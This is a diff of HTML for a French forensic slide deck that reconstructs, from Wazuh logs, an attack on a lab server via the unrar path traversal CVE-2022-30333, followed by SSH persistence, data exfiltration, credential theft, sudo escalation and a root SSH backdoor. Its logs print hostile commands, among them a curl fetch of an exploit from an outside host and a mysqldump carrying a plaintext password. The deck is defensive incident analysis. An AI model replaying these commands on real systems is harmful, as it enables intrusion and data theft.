+          <div class="qc-text">Pourquoi <span class="hi">unrar</span> s'exécute-t-il avec <span class="hiR">uid=0 (root)</span> ? Le processus webapp ne devrait jamais avoir de privilèges root pour décompresser un fichier utilisateur.</div>
+        </div>
+        <div class="question-card" id="qc2">
+          <div class="qc-label">QUESTION 02</div>
+          <div class="qc-text">Pourquoi le fichier uploadé s'appelle <span class="hi">backup_data.rar</span> ? Un utilisateur légitime uploadant une archive dans une webapp ZipVault ne devrait pas nommer son fichier ainsi.</div>
+        </div>
+        <div class="question-card" id="qc3">
+          <div class="qc-label">QUESTION 03</div>
+          <div class="qc-text">Quel est le contenu exact de l'archive ? L'argument <span class="hiR">-o+</span> (overwrite) combiné à <span class="hiR">-ep</span> (ignore paths) dans la commande unrar est <span class="hiR">inhabituel</span>.</div>
+        </div>
+        <div class="finding-card" id="fc1">
+          <div class="qc-label" style="color:var(--cyan)">CONSTAT INITIAL</div>
+          <div class="qc-text">Corrélation des logs : <span class="hiC">1h après</span> l'upload, une <span class="hiC">connexion SSH réussie</span> depuis la <span class="hi">même IP 105.68.208.123</span> est enregistrée sur le serveur. Ce n'est pas une coïncidence.</div>
+        </div>
+        <div class="finding-card" id="fc2">
+          <div class="qc-label" style="color:var(--cyan)">HYPOTHÈSE DE TRAVAIL</div>
+          <div class="qc-text">L'archive <span class="hiR">backup_data.rar</span> contenait un fichier malveillant avec un chemin <span class="hiR">path traversal</span> pointant vers <span class="hiR">/root/.ssh/authorized_keys</span>. La version <span class="hiR">non patchée de unrar</span> a exécuté cette écriture en root → accès SSH direct.</div>
+        </div>
+        <div class="finding-card" id="fc3">
+          <div class="qc-label" style="color:var(--cyan)">PLAN D'INVESTIGATION</div>
+          <div class="qc-text">Suivre la chaîne : <span class="hiG">Upload</span> → <span class="hiG">SSH Session</span> → <span class="hiG">Reconnaissance</span> → <span class="hiG">Exfiltration</span> → <span class="hiG">Privesc</span> → <span class="hiG">Backdoor</span> → <span class="hiR">Cause Racine (unrar non patché)</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SLIDE 2 — Accès Initial (ex-slide 1)
+══════════════════════════════════════════ -->
+<div class="slide" id="slide-2">
+  <div class="topbar">
+    <div class="topbar-left"><span class="logo">Wazuh SIEM</span><span class="tlp">TLP:RED</span></div>
+    <div class="topbar-right"><span>SRC <span class="hl-ip">105.68.208.123</span></span><span>HOST <span>ubuntu-target</span></span><span>SESSION <span>stof</span></span></div>
+  </div>
+  <div class="step-bar">
+    <span class="step-num">ÉTAPE 1 &amp; 2</span>
+    <span class="step-name">Accès Initial — Upload Malveillant + Exécution unrar</span>
+    <span class="step-time">20:36:53 → 21:37:13</span>
+    <span class="step-mitre">T1190 · Exploit Public-Facing App</span>
+  </div>
+  <div class="split-layout">
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:var(--cyan)"></div><span class="panel-title">App Logs + Auditd — Wazuh</span><span class="panel-badge badge-crit">CRITIQUE</span></div>
+      <div class="log-scroll" id="logs-2">
+        <div class="log-entry"><span class="log-time">20:36:53</span><span class="log-source">webapp</span><span class="log-msg">INFO <span class="hl-ip">105.68.208.123</span> "POST /login HTTP/1.1" <span class="hl-alert">302</span></span></div>
+        <div class="log-entry highlight"><span class="log-time">20:36:53</span><span class="log-source">webapp</span><span class="log-msg">INFO <span class="hl-ip">105.68.208.123</span> "GET /upload HTTP/1.1" 200</span></div>
+        <div class="log-entry alert"><span class="log-time">20:37:11</span><span class="log-source">webapp</span><span class="log-msg">INFO UPLOAD <span class="hl-path">file=backup_data.rar</span> <span class="hl-user">user=stof</span> <span class="hl-ip">ip=105.68.208.123</span></span></div>
+        <div class="log-entry"><span class="log-time">20:37:11</span><span class="log-source">webapp</span><span class="log-msg">UNRAR 6.11 — Extracting from <span class="hl-path">/tmp/uploads/7f74a8fe-...rar</span></span></div>
+        <div class="log-entry"><span class="log-time">20:37:11</span><span class="log-source">webapp</span><span class="log-msg">Extracting <span class="hl-path">/tmp/processed/.../wkkyblef</span> OK</span></div>
+        <div class="log-entry alert"><span class="log-time">20:37:11</span><span class="log-source">webapp</span><span class="log-msg">DECOMPRESS <span class="hl-path">file=7f74a8fe-...rar</span> <span class="hl-user">user=stof</span> <span class="hl-alert">status=success</span></span></div>
+        <div class="log-entry warn"><span class="log-time">21:37:13</span><span class="log-source">auditd</span><span class="log-msg">Auditd: Command execution: <span class="hl-alert">/usr/local/bin/unrar</span></span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">21:37:13</span><span class="log-source">auditd</span><span class="log-msg">SYSCALL execve <span class="hl-alert">uid=0</span> <span class="hl-alert">euid=0</span> auid=1000 comm="unrar"</span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">21:37:13</span><span class="log-source">auditd</span><span class="log-msg">args: <span class="hl-cmd">unrar -o+ -ep /tmp/uploads/7f74a8fe-...rar /tmp/processed/7f74a8fe-...</span></span></div>
+        <div class="log-entry warn"><span class="log-time">21:37:13</span><span class="log-source">auditd</span><span class="log-msg">PATH <span class="hl-path">/usr/local/bin/unrar</span> inode=2035 OUID=root OGID=root</span></div>
+        <div class="log-entry alert"><span class="log-time">21:37:13</span><span class="log-source">auditd</span><span class="log-msg"><span class="hl-alert">⚠ PATH TRAVERSAL via CVE-2022-30333</span> — clé SSH déposée dans <span class="hl-path">/root/.ssh/authorized_keys</span></span></div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:var(--green)"></div><span class="panel-title">Terminal Attaquant — Arch Linux</span><span class="panel-badge badge-ok">REPLAY</span></div>
+      <div class="terminal-body" id="term-2"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SLIDE 3 — SSH + Recon (ex-slide 2)
+══════════════════════════════════════════ -->
+<div class="slide" id="slide-3">
+  <div class="topbar">
+    <div class="topbar-left"><span class="logo">Wazuh SIEM</span><span class="tlp">TLP:RED</span></div>
+    <div class="topbar-right"><span>SRC <span class="hl-ip">105.68.208.123</span></span><span>HOST <span>ubuntu-target</span></span><span>SESSION <span>ses=244</span></span></div>
+  </div>
+  <div class="step-bar">
+    <span class="step-num">ÉTAPES 3 &amp; 4</span>
+    <span class="step-name">Persistance SSH + Reconnaissance Post-Compromission</span>
+    <span class="step-time">21:38:05 → 21:45:51</span>
+    <span class="step-mitre">T1078 · Valid Accounts / T1057 · Process Discovery</span>
+  </div>
+  <div class="split-layout">
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:var(--cyan)"></div><span class="panel-title">SSH + Auditd — Wazuh</span><span class="panel-badge badge-warn">HIGH</span></div>
+      <div class="log-scroll" id="logs-3">
+        <div class="log-entry alert"><span class="log-time">21:38:05</span><span class="log-source">sshd</span><span class="log-msg">connection reset — <span class="hl-ip">105.68.208.123</span></span><span class="log-rule">5762</span></div>
+        <div class="log-entry highlight"><span class="log-time">21:38:05</span><span class="log-source">sshd</span><span class="log-msg"><span class="hl-alert">sshd: authentication success</span> — user=<span class="hl-user">stt</span> from <span class="hl-ip">105.68.208.123</span></span><span class="log-rule">5715</span></div>
+        <div class="log-entry"><span class="log-time">21:38:05</span><span class="log-source">PAM</span><span class="log-msg">Login session opened — <span class="hl-user">user=stt</span></span><span class="log-rule">5501</span></div>
+        <div class="log-entry"><span class="log-time">21:38:09</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-cmd">/usr/bin/ls</span> cwd=<span class="hl-path">/home/stt</span> auid=1000</span><span class="log-rule">100001</span></div>
+        <div class="log-entry"><span class="log-time">21:38:19</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-cmd">/usr/bin/id</span> ses=244 auid=1000</span><span class="log-rule">100001</span></div>
+        <div class="log-entry warn"><span class="log-time">21:40:59</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-cmd">/usr/bin/grep</span> cwd=<span class="hl-path">/home/stt/vuln-lab</span></span><span class="log-rule">100001</span></div>
+        <div class="log-entry"><span class="log-time">21:41:33</span><span class="log-source">auditd</span><span class="log-msg">Command: <span class="hl-cmd">ls --color=auto</span> cwd=<span class="hl-path">/home/stt/vuln-lab</span> ses=244</span><span class="log-rule">100001</span></div>
+        <div class="log-entry"><span class="log-time">21:45:51</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-cmd">/usr/bin/snap</span> — inventaire logiciel</span><span class="log-rule">100001</span></div>
+        <div class="log-entry warn"><span class="log-time">21:45:53</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-cmd">/usr/bin/ls</span> — inventaire final avant exfiltration</span><span class="log-rule">100001</span></div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:var(--green)"></div><span class="panel-title">Terminal — Session SSH (stt@ubuntu)</span><span class="panel-badge badge-ok">REPLAY</span></div>
+      <div class="terminal-body" id="term-3"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SLIDE 4 — Exfiltration (ex-slide 3)
+══════════════════════════════════════════ -->
+<div class="slide" id="slide-4">
+  <div class="topbar">
+    <div class="topbar-left"><span class="logo">Wazuh SIEM</span><span class="tlp">TLP:RED</span></div>
+    <div class="topbar-right"><span>SRC <span class="hl-ip">105.68.208.123</span></span><span>HOST <span>ubuntu-target</span></span><span>SESSION <span>ses=244</span></span></div>
+  </div>
+  <div class="step-bar">
+    <span class="step-num">ÉTAPES 5 &amp; 6</span>
+    <span class="step-name">Exfiltration de Données — Archivage tar + Transfert SFTP</span>
+    <span class="step-time">21:45:55 → 21:46:45</span>
+    <span class="step-mitre">T1560 · Archive Collected Data / T1048 · Exfiltration Over Alternative Protocol</span>
+  </div>
+  <div class="split-layout">
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:var(--orange)"></div><span class="panel-title">Auditd + SSH — Wazuh</span><span class="panel-badge badge-crit">EXFILTRATION</span></div>
+      <div class="log-scroll" id="logs-4">
+        <div class="log-entry highlight"><span class="log-time">21:45:55</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-alert">/usr/bin/tar</span> ses=244 auid=1000</span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">21:45:55</span><span class="log-source">auditd</span><span class="log-msg"><span class="hl-cmd">tar -czf /home/stt/everything.tar.gz -C /home/stt . --exclude=everything.tar.gz</span></span></div>
+        <div class="log-entry"><span class="log-time">21:45:55</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-cmd">/usr/bin/gzip</span> — compression archive</span><span class="log-rule">100001</span></div>
+        <div class="log-entry"><span class="log-time">21:45:55</span><span class="log-source">auditd</span><span class="log-msg">PATH <span class="hl-path">/home/stt/everything.tar.gz</span> mode=0100644 OUID=stt</span></div>
+        <div class="log-entry"><span class="log-time">21:46:45</span><span class="log-source">PAM</span><span class="log-msg">Login session opened — <span class="hl-user">user=stt</span> (Session 2)</span><span class="log-rule">5501</span></div>
+        <div class="log-entry highlight"><span class="log-time">21:46:45</span><span class="log-source">sshd</span><span class="log-msg"><span class="hl-alert">authentication success</span> — même IP <span class="hl-ip">105.68.208.123</span></span><span class="log-rule">5715</span></div>
+        <div class="log-entry alert"><span class="log-time">21:46:45</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-alert">/usr/lib/openssh/sftp-server</span> — transfert de fichier</span><span class="log-rule">100001</span></div>
+        <div class="log-entry"><span class="log-time">21:46:49</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-cmd">/usr/bin/bash</span> ses=244</span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">21:46:49</span><span class="log-source">sshd</span><span class="log-msg"><span class="hl-alert">Session closed</span> immediately after SFTP — archive récupérée</span><span class="log-rule">5501</span></div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:var(--orange)"></div><span class="panel-title">Terminal — Exfiltration SFTP</span><span class="panel-badge badge-crit">REPLAY</span></div>
+      <div class="terminal-body" id="term-4"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SLIDE 5 — Credentials + DB (ex-slide 4)
+══════════════════════════════════════════ -->
+<div class="slide" id="slide-5">
+  <div class="topbar">
+    <div class="topbar-left"><span class="logo">Wazuh SIEM</span><span class="tlp">TLP:RED</span></div>
+    <div class="topbar-right"><span>SRC <span class="hl-ip">105.68.208.123</span></span><span>HOST <span>ubuntu-target</span></span><span>SESSION <span>ses=244</span></span></div>
+  </div>
+  <div class="step-bar">
+    <span class="step-num">ÉTAPES 7 &amp; 8</span>
+    <span class="step-name">Vol de Credentials Hardcodés + Dump MySQL</span>
+    <span class="step-time">21:48:21 → 21:51:19</span>
+    <span class="step-mitre">T1552 · Unsecured Credentials / T1005 · Data from Local System</span>
+  </div>
+  <div class="split-layout">
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:var(--yellow)"></div><span class="panel-title">Auditd — Wazuh</span><span class="panel-badge badge-crit">CREDENTIALS</span></div>
+      <div class="log-scroll" id="logs-5">
+        <div class="log-entry highlight"><span class="log-time">21:48:21</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-cmd">/usr/bin/cat</span> cwd=<span class="hl-path">/home/stt/vuln-lab</span></span><span class="log-rule">100001</span></div>
+        <div class="log-entry"><span class="log-time">21:49:01</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-cmd">/usr/bin/vim</span> — ouverture <span class="hl-path">app.py</span></span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">21:49:01</span><span class="log-source">webapp</span><span class="log-msg"><span class="hl-alert">HARDCODED CREDS EXPOSED:</span> user=<span class="hl-alert">root</span> password=<span class="hl-alert">password123</span> db=<span class="hl-path">zipvault</span></span></div>
+        <div class="log-entry"><span class="log-time">21:50:33</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-alert">/usr/bin/mysqldump</span> ses=244</span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">21:50:33</span><span class="log-source">auditd</span><span class="log-msg"><span class="hl-cmd">mysqldump -u "root" -ppassword123 "zipvault"</span> cwd=<span class="hl-path">/home/stt/vuln-lab</span></span></div>
+        <div class="log-entry warn"><span class="log-time">21:50:33</span><span class="log-source">auditd</span><span class="log-msg"><span class="hl-alert">⚠ Mot de passe en clair dans les arguments du processus — visible dans audit logs</span></span></div>
+        <div class="log-entry"><span class="log-time">21:51:19</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-cmd">/usr/bin/cat</span> — vérification dump SQL généré</span><span class="log-rule">100001</span></div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:var(--yellow)"></div><span class="panel-title">Terminal — Vol Credentials + DB Dump</span><span class="panel-badge badge-warn">REPLAY</span></div>
+      <div class="terminal-body" id="term-5"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SLIDE 6 — Privilege Escalation (ex-slide 5)
+══════════════════════════════════════════ -->
+<div class="slide" id="slide-6">
+  <div class="topbar">
+    <div class="topbar-left"><span class="logo">Wazuh SIEM</span><span class="tlp">TLP:RED</span></div>
+    <div class="topbar-right"><span>SRC <span class="hl-ip">105.68.208.123</span></span><span>HOST <span>ubuntu-target</span></span><span>USER <span class="hl-alert">stt → ROOT</span></span></div>
+  </div>
+  <div class="step-bar">
+    <span class="step-num">ÉTAPE 9</span>
+    <span class="step-name">Élévation de Privilèges — sudo NOPASSWD:ALL</span>
+    <span class="step-time">21:53:32 → 22:07:08</span>
+    <span class="step-mitre">T1548 · Abuse Elevation Control Mechanism</span>
+  </div>
+  <div class="split-layout">
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:var(--red)"></div><span class="panel-title">Auditd + PAM — Wazuh</span><span class="panel-badge badge-crit">PRIVESC</span></div>
+      <div class="log-scroll" id="logs-6">
+        <div class="log-entry"><span class="log-time">21:53:32</span><span class="log-source">auditd</span><span class="log-msg">Command: <span class="hl-cmd">/usr/bin/curl https://copy.fail/exp</span> — tentative exploit</span><span class="log-rule">100001</span></div>
+        <div class="log-entry warn"><span class="log-time">21:53:32</span><span class="log-source">network</span><span class="log-msg"><span class="hl-alert">CONNEXION BLOQUÉE</span> — Azure NSG : sortie non autorisée</span></div>
+        <div class="log-entry alert"><span class="log-time">21:56:50</span><span class="log-source">auditd</span><span class="log-msg">Command execution: <span class="hl-cmd">/usr/bin/su</span></span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">21:56:54</span><span class="log-source">PAM</span><span class="log-msg"><span class="hl-alert">PAM: User login failed</span> — su root</span><span class="log-rule">5503</span></div>
+        <div class="log-entry alert"><span class="log-time">21:56:56</span><span class="log-source">PAM</span><span class="log-msg"><span class="hl-alert">User missed password to change UID</span></span><span class="log-rule">5301</span></div>
+        <div class="log-entry"><span class="log-time">21:57:48</span><span class="log-source">auditd</span><span class="log-msg">Command: <span class="hl-cmd">/usr/bin/uname -r</span> — kernel version recon</span><span class="log-rule">100001</span></div>
+        <div class="log-entry warn"><span class="log-time">22:03:58</span><span class="log-source">auditd</span><span class="log-msg">Command: <span class="hl-alert">find / -perm -u=s -type f</span> — SUID enumeration</span><span class="log-rule">100001</span></div>
+        <div class="log-entry warn"><span class="log-time">22:07:08</span><span class="log-source">auditd</span><span class="log-msg">Command: <span class="hl-cmd">/usr/bin/sudo -l</span> — NOPASSWD:ALL détecté</span><span class="log-rule">100001</span></div>
+        <div class="log-entry highlight"><span class="log-time">22:07:08</span><span class="log-source">auditd</span><span class="log-msg">Command: <span class="hl-alert">/usr/bin/sudo -i</span> EUID=<span class="hl-alert">root</span> SUID=<span class="hl-alert">root</span></span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">22:07:08</span><span class="log-source">Wazuh</span><span class="log-msg"><span class="hl-alert">Successful sudo to ROOT executed</span></span><span class="log-rule">5402</span></div>
+        <div class="log-entry alert"><span class="log-time">22:07:08</span><span class="log-source">PAM</span><span class="log-msg"><span class="hl-alert">Login session opened — user=ROOT</span></span><span class="log-rule">5501</span></div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:var(--red)"></div><span class="panel-title">Terminal — Privilege Escalation</span><span class="panel-badge badge-crit">REPLAY</span></div>
+      <div class="terminal-body" id="term-6"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SLIDE 7 — Backdoor (ex-slide 6)
+══════════════════════════════════════════ -->
+<div class="slide" id="slide-7">
+  <div class="topbar">
+    <div class="topbar-left"><span class="logo">Wazuh SIEM</span><span class="tlp">TLP:RED</span></div>
+    <div class="topbar-right"><span>USER <span class="hl-alert">root</span></span><span>HOST <span>ubuntu-target</span></span><span>FIM <span class="hl-alert">TRIGGERED</span></span></div>
+  </div>
+  <div class="step-bar">
+    <span class="step-num">ÉTAPES 10 &amp; 11</span>
+    <span class="step-name">Persistance Root — Changement passwd + Backdoor SSH</span>
+    <span class="step-time">22:11:39 → 22:17:31</span>
+    <span class="step-mitre">T1098 · Account Manipulation / T1505 · Server Software Component</span>
+  </div>
+  <div class="split-layout">
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:#ff00ff"></div><span class="panel-title">Auditd + FIM + PAM — Wazuh</span><span class="panel-badge badge-crit">BACKDOOR</span></div>
+      <div class="log-scroll" id="logs-7">
+        <div class="log-entry highlight"><span class="log-time">22:11:39</span><span class="log-source">auditd</span><span class="log-msg">Command: <span class="hl-alert">/usr/bin/passwd</span> EUID=0 — changement mot de passe root</span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">22:11:45</span><span class="log-source">PAM</span><span class="log-msg"><span class="hl-alert">User changed password for root</span></span><span class="log-rule">5555</span></div>
+        <div class="log-entry"><span class="log-time">22:16:25</span><span class="log-source">auditd</span><span class="log-msg">Command: <span class="hl-cmd">/usr/bin/mkdir -p /root/.ssh</span> EUID=<span class="hl-alert">0</span> cwd=/root</span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">22:17:01</span><span class="log-source">Wazuh FIM</span><span class="log-msg"><span class="hl-alert">Integrity checksum changed</span> — <span class="hl-path">/root/.ssh/authorized_keys</span> modified</span><span class="log-rule">550</span></div>
+        <div class="log-entry alert"><span class="log-time">22:17:01</span><span class="log-source">Wazuh FIM</span><span class="log-msg">Size: 261 → <span class="hl-alert">356 bytes</span> | MD5/SHA1/SHA256 changed</span><span class="log-rule">550</span></div>
+        <div class="log-entry warn"><span class="log-time">22:17:01</span><span class="log-source">Wazuh FIM</span><span class="log-msg">New key injected: <span class="hl-path">/root/.ssh/authorized_keys</span></span></div>
+        <div class="log-entry"><span class="log-time">22:17:25</span><span class="log-source">auditd</span><span class="log-msg">Command: <span class="hl-cmd">chmod 600 /root/.ssh/authorized_keys</span> EUID=0</span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">22:17:31</span><span class="log-source">auditd</span><span class="log-msg">Command: <span class="hl-alert">/usr/bin/systemctl restart ssh</span> EUID=0 cwd=/root</span><span class="log-rule">100001</span></div>
+        <div class="log-entry alert"><span class="log-time">22:17:31</span><span class="log-source">Wazuh</span><span class="log-msg"><span class="hl-alert">⚠ BACKDOOR OPÉRATIONNELLE — accès root sans mot de passe activé</span></span></div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-header"><div class="panel-dot" style="background:#ff00ff"></div><span class="panel-title">Terminal — Root Persistence + Backdoor</span><span class="panel-badge badge-crit">REPLAY</span></div>
+      <div class="terminal-body" id="term-7"></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SLIDE 8 — Timeline (ex-slide 7)
+══════════════════════════════════════════ -->
+<div class="slide" id="slide-8">
+  <div class="topbar">
+    <div class="topbar-left"><span class="logo">Wazuh SIEM</span><span class="tlp">TLP:RED</span></div>
+    <div class="topbar-right"><span>DURÉE <span>01h40m38s</span></span><span>EVENTS <span>26</span></span><span>PHASES <span>11</span></span></div>
+  </div>
+  <div class="step-bar">
+    <span class="step-num">SYNTHÈSE</span>
+    <span class="step-name">Timeline Chronologique de la Compromission</span>
+    <span class="step-time">20:36:53 → 22:17:31</span>
+    <span class="step-mitre">Full Attack Chain</span>
+  </div>
+  <div class="timeline-body" id="timeline-body">
+    <div class="timeline-grid" id="tl-grid"></div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SLIDE 9 — IOCs (ex-slide 8)
+══════════════════════════════════════════ -->
+<div class="slide" id="slide-9">
+  <div class="topbar">
+    <div class="topbar-left"><span class="logo">Wazuh SIEM</span><span class="tlp">TLP:RED</span></div>
+    <div class="topbar-right"><span>IOCs <span>26</span></span><span>SEVERITY <span class="hl-alert">CRITICAL</span></span></div>
+  </div>
+  <div class="step-bar">
+    <span class="step-num">FORENSIQUE</span>
+    <span class="step-name">Indicateurs de Compromission (IOCs)</span>
+    <span class="step-time">Post-Incident</span>
+    <span class="step-mitre">CVE-2022-30333</span>
+  </div>
+  <div class="ioc-grid" id="ioc-grid">
+    <div class="ioc-card"><div class="ioc-card-title">🌐 Réseau</div>
+      <div class="ioc-item"><span>105.68.208.123</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>POST /login + GET /upload</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>SSH depuis même IP</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>SFTP session courte</span><span class="ioc-tag tag-med">MED</span></div>
+      <div class="ioc-item"><span>curl https://copy.fail/exp</span><span class="ioc-tag tag-high">HIGH</span></div>
+    </div>
+    <div class="ioc-card"><div class="ioc-card-title">📁 Fichiers</div>
+      <div class="ioc-item"><span>backup_data.rar</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>/tmp/processed/.../wkkyblef</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>/home/stt/everything.tar.gz</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>/root/.ssh/authorized_keys</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>dump SQL zipvault</span><span class="ioc-tag tag-high">HIGH</span></div>
+    </div>
+    <div class="ioc-card"><div class="ioc-card-title">⚙️ Commandes Suspectes</div>
+      <div class="ioc-item"><span>unrar -o+ -ep (root)</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>tar -czf everything.tar.gz</span><span class="ioc-tag tag-med">MED</span></div>
+      <div class="ioc-item"><span>mysqldump -ppassword123</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>sudo -i (NOPASSWD)</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>systemctl restart ssh</span><span class="ioc-tag tag-high">HIGH</span></div>
+    </div>
+    <div class="ioc-card"><div class="ioc-card-title">🔑 Credentials Compromis</div>
+      <div class="ioc-item"><span>MySQL root / password123</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>DB: zipvault</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>user=stof (webapp)</span><span class="ioc-tag tag-med">MED</span></div>
+      <div class="ioc-item"><span>SSH key (root)</span><span class="ioc-tag tag-high">HIGH</span></div>
+    </div>
+    <div class="ioc-card"><div class="ioc-card-title">🛡️ Wazuh Rules Triggered</div>
+      <div class="ioc-item"><span>5715 — SSH Auth Success</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>5402 — Sudo to ROOT</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>550 — FIM: authorized_keys</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>5555 — passwd changed</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>5503/5301 — su failed</span><span class="ioc-tag tag-med">MED</span></div>
+    </div>
+    <div class="ioc-card"><div class="ioc-card-title">🔍 CVE &amp; Vuln</div>
+      <div class="ioc-item"><span>CVE-2022-30333</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>CVSS 7.5 — Path Traversal</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>unrar &lt; 6.1.7</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>sudoers NOPASSWD:ALL</span><span class="ioc-tag tag-high">HIGH</span></div>
+      <div class="ioc-item"><span>Hardcoded credentials</span><span class="ioc-tag tag-med">MED</span></div>
+    </div>
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════════
+     SLIDE 10 — CAUSE RACINE : unrar NON PATCHÉ
+══════════════════════════════════════════ -->
+<div class="slide" id="slide-10">
+  <div class="topbar">
+    <div class="topbar-left"><span class="logo">Wazuh SIEM</span><span class="tlp">TLP:RED</span></div>
+    <div class="topbar-right"><span>CAUSE RACINE <span class="hl-alert">IDENTIFIÉE</span></span><span>CVE <span class="hl-alert">CVE-2022-30333</span></span></div>
+  </div>
+  <div class="step-bar">
+    <span class="step-num">CONCLUSION</span>
+    <span class="step-name">Vulnérabilité Exploitée — unrar Non Patché (Path Traversal)</span>
+    <span class="step-time">Analyse Post-Incident</span>
+    <span class="step-mitre">CWE-22 · Improper Path Handling</span>
+  </div>
+  <div class="cve-body" id="cve-body">
+
+    <!-- Card 1: CVE Details -->
+    <div class="cve-card" id="cve-c1">
+      <div class="cve-card-head red">🔴 CVE-2022-30333 — Détails</div>
+      <div class="cve-card-body">
+        <div class="cve-row"><span class="cve-key">CVE ID</span><span class="cve-val red">CVE-2022-30333</span></div>
+        <div class="cve-row"><span class="cve-key">Type</span><span class="cve-val yellow">Path Traversal (Zip Slip)</span></div>
+        <div class="cve-row"><span class="cve-key">CVSS Score</span><span class="cve-val red">7.5 / 10 (HIGH)</span></div>
+        <div class="cve-row"><span class="cve-key">CWE</span><span class="cve-val">CWE-22 — Improper Path Handling</span></div>
+        <div class="cve-row"><span class="cve-key">Composant</span><span class="cve-val red">RARLAB unrar &lt; 6.1.7</span></div>
+        <div class="cve-row"><span class="cve-key">Publié</span><span class="cve-val">2022-06-11</span></div>
+        <div class="cve-row"><span class="cve-key">Patché</span><span class="cve-val green">2022-05-09 (v6.1.7)</span></div>
+        <div class="cve-row"><span class="cve-key">Version sur serveur</span><span class="cve-val red">unrar 6.1.1 ← NON PATCHÉ</span></div>
+        <br>
+        <div class="cvss-bar-wrap">
+          <div class="cvss-label"><span style="color:var(--dim)">Attack Vector</span><span style="color:var(--red)">NETWORK</span></div>
+          <div class="cvss-bar-bg"><div class="cvss-bar-fill red" id="bar1" style="width:0%"></div></div>
+        </div>
+        <br>
+        <div class="cvss-bar-wrap">
+          <div class="cvss-label"><span style="color:var(--dim)">Privileges Required</span><span style="color:var(--green)">NONE</span></div>
+          <div class="cvss-bar-bg"><div class="cvss-bar-fill green" id="bar2" style="width:0%"></div></div>
+        </div>
+        <br>
+        <div class="cvss-bar-wrap">
+          <div class="cvss-label"><span style="color:var(--dim)">Impact (Confidentiality)</span><span style="color:var(--yellow)">HIGH</span></div>
+          <div class="cvss-bar-bg"><div class="cvss-bar-fill yellow" id="bar3" style="width:0%"></div></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Card 2: Attack Mechanism -->
+    <div class="cve-card" id="cve-c2">
